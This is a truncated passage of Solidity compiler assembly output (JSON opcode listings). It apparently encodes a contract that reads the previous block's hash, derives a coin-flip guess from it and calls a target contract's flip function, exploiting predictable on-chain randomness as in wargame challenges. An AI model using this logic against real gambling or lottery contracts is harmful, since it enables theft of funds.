										{
											"begin": 167,
											"end": 711,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 167,
											"end": 711,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "PUSH",
											"source": 1,
											"value": "F32D251D"
										},
										{
											"begin": 167,
											"end": 711,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 167,
											"end": 711,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "tag",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 167,
											"end": 711,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 167,
											"end": 711,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 453,
											"end": 706,
											"name": "tag",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 453,
											"end": 706,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 453,
											"end": 706,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 453,
											"end": 706,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 453,
											"end": 706,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 453,
											"end": 706,
											"name": "tag",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 453,
											"end": 706,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 453,
											"end": 706,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 453,
											"end": 706,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 453,
											"end": 706,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 453,
											"end": 706,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 453,
											"end": 706,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 453,
											"end": 706,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 453,
											"end": 706,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 453,
											"end": 706,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 453,
											"end": 706,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 453,
											"end": 706,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 453,
											"end": 706,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 453,
											"end": 706,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 453,
											"end": 706,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 453,
											"end": 706,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 453,
											"end": 706,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 453,
											"end": 706,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "tag",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 198,
											"end": 228,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 198,
											"end": 228,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 198,
											"end": 228,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 198,
											"end": 228,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 198,
											"end": 228,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 198,
											"end": 228,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 198,
											"end": 228,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "tag",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 198,
											"end": 228,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 198,
											"end": 228,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 453,
											"end": 706,
											"name": "tag",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 453,
											"end": 706,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 485,
											"end": 489,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 500,
											"end": 518,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 554,
											"end": 555,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 539,
											"end": 551,
											"name": "NUMBER",
											"source": 1
										},
										{
											"begin": 539,
											"end": 555,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 539,
											"end": 555,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 539,
											"end": 555,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 539,
											"end": 555,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 539,
											"end": 555,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 539,
											"end": 555,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 539,
											"end": 555,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 529,
											"end": 556,
											"name": "BLOCKHASH",
											"source": 1
										},
										{
											"begin": 521,
											"end": 557,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 521,
											"end": 557,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 500,
											"end": 557,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 500,
											"end": 557,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 566,
											"end": 582,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 604,
											"end": 610,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 604,
											"end": 610,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 593,
											"end": 603,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 593,
											"end": 610,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 593,
											"end": 610,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 593,
											"end": 610,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 593,
											"end": 610,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 593,
											"end": 610,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 593,
											"end": 610,
											"name": "tag",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 593,
											"end": 610,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 566,
											"end": 611,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 566,
											"end": 611,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 620,
											"end": 629,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 644,
											"end": 645,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 632,
											"end": 640,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 632,
											"end": 645,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 632,
											"end": 660,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 632,
											"end": 660,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 655,
											"end": 660,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 632,
											"end": 660,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 632,
											"end": 660,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 632,
											"end": 660,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 632,
											"end": 660,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 648,
											"end": 652,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 632,
											"end": 660,
											"name": "tag",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 632,
											"end": 660,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 620,
											"end": 660,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 620,
											"end": 660,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 669,
											"end": 683,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 669,
											"end": 683,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 669,
											"end": 683,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 669,
											"end": 683,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 669,
											"end": 683,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 669,
											"end": 683,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 669,
											"end": 683,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 669,
											"end": 683,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 669,
											"end": 683,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 669,
											"end": 683,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 669,
											"end": 688,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 669,
											"end": 688,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 669,
											"end": 688,
											"name": "PUSH",
											"source": 1,
											"value": "1D263F67"
										},
										{
											"begin": 689,
											"end": 693,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 669,
											"end": 694,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "tag",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 669,
											"end": 694,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "tag",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 669,
											"end": 694,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 669,
											"end": 694,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 491,
											"end": 706,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 491,
											"end": 706,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 491,
											"end": 706,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 453,
											"end": 706,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 453,
											"end": 706,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "tag",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 198,
											"end": 228,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 198,
											"end": 228,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 198,
											"end": 228,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 198,
											"end": 228,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 198,
											"end": 228,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 97,
											"name": "tag",
											"source": 3,
											"value": "25"
										},
										{
											"begin": 7,
											"end": 97,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 41,
											"end": 48,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 84,
											"end": 89,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 77,
											"end": 90,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 70,
											"end": 91,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 59,
											"end": 91,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 59,
											"end": 91,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7,
											"end": 97,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 7,
											"end": 97,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7,
											"end": 97,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7,
											"end": 97,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 103,
											"end": 212,
											"name": "tag",
											"source": 3,
											"value": "26"
										},
										{
											"begin": 103,
											"end": 212,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 184,
											"end": 205,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "44"
										},
										{
											"begin": 199,
											"end": 204,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 184,
											"end": 205,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "25"
										},
										{
											"begin": 184,
											"end": 205,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 184,
											"end": 205,
											"name": "tag",
											"source": 3,
											"value": "44"
										},
										{
											"begin": 184,
											"end": 205,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 179,
											"end": 182,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 172,
											"end": 206,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 103,
											"end": 212,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 103,
											"end": 212,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 103,
											"end": 212,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 218,
											"end": 428,
											"name": "tag",
											"source": 3,
											"value": "8"
										},
										{
											"begin": 218,
											"end": 428,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 305,
											"end": 309,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 343,
											"end": 345,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 332,
											"end": 341,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 328,
											"end": 346,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 320,
											"end": 346,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 320,
											"end": 346,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 356,
											"end": 421,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "46"
										},
										{
											"begin": 418,
											"end": 419,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 407,
											"end": 416,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 403,
											"end": 420,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 394,
											"end": 400,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 356,
											"end": 421,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "26"
										},
										{
											"begin": 356,
											"end": 421,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 356,
											"end": 421,
											"name": "tag",
											"source": 3,
											"value": "46"
										},
										{
											"begin": 356,
											"end": 421,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 218,
											"end": 428,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 218,
											"end": 428,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 218,
											"end": 428,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 218,
											"end": 428,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 218,
											"end": 428,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 434,
											"end": 560,
											"name": "tag",
											"source": 3,
											"value": "27"
										},
										{
											"begin": 434,
											"end": 560,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 471,
											"end": 478,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 511,
											"end": 553,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 504,
											"end": 509,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 500,
											"end": 554,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 489,
											"end": 554,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 489,
											"end": 554,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 434,
											"end": 560,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 434,
											"end": 560,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 434,
											"end": 560,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 434,
											"end": 560,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 566,
											"end": 626,
											"name": "tag",
											"source": 3,
											"value": "28"
										},
										{
											"begin": 566,
											"end": 626,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 594,
											"end": 597,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 615,
											"end": 620,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 608,
											"end": 620,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 608,
											"end": 620,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 566,
											"end": 626,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 566,
											"end": 626,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 566,
											"end": 626,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 566,
											"end": 626,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 632,
											"end": 774,
											"name": "tag",
											"source": 3,
											"value": "29"
										},
										{
											"begin": 632,
											"end": 774,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 682,
											"end": 691,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 715,
											"end": 768,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "50"
										},
										{
											"begin": 733,
											"end": 767,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "51"
										},
										{
											"begin": 742,
											"end": 766,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "52"
										},
										{
											"begin": 760,
											"end": 765,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 742,
											"end": 766,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "27"
										},
										{
											"begin": 742,
											"end": 766,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 742,
											"end": 766,
											"name": "tag",
											"source": 3,
											"value": "52"
										},
										{
											"begin": 742,
											"end": 766,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 733,
											"end": 767,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "28"
										},
										{
											"begin": 733,
											"end": 767,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 733,
											"end": 767,
											"name": "tag",
											"source": 3,
											"value": "51"
										},
										{
											"begin": 733,
											"end": 767,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 715,
											"end": 768,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "27"
										},
										{
											"begin": 715,
											"end": 768,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 715,
											"end": 768,
											"name": "tag",
											"source": 3,
											"value": "50"
										},
										{
											"begin": 715,
											"end": 768,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 702,
											"end": 768,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 702,
											"end": 768,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 632,
											"end": 774,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 632,
											"end": 774,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 632,
											"end": 774,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 632,
											"end": 774,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 780,
											"end": 906,
											"name": "tag",
											"source": 3,
											"value": "30"
										},
										{
											"begin": 780,
											"end": 906,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 830,
											"end": 839,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 863,
											"end": 900,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "54"
										},
										{
											"begin": 894,
											"end": 899,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 863,
											"end": 900,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "29"
										},
										{
											"begin": 863,
											"end": 900,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 863,
											"end": 900,
											"name": "tag",
											"source": 3,
											"value": "54"
										},
										{
											"begin": 863,
											"end": 900,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 850,
											"end": 900,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 850,
											"end": 900,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 780,
											"end": 906,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 780,
											"end": 906,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 780,
											"end": 906,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 780,
											"end": 906,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 912,
											"end": 1053,
											"name": "tag",
											"source": 3,
											"value": "31"
										},
										{
											"begin": 912,
											"end": 1053,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 977,
											"end": 986,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1010,
											"end": 1047,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "56"
										},
										{
											"begin": 1041,
											"end": 1046,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1010,
											"end": 1047,
